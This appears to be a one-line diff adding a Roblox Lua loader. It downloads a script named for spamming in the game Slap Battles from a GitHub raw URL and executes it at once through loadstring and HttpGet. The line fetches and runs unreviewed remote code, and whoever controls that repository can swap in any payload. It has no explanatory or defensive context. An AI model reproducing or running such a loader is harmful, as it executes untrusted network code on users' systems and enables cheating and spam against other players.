@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/update-slap-battles-spam0-a009c3t0m4daqn.lua"))()
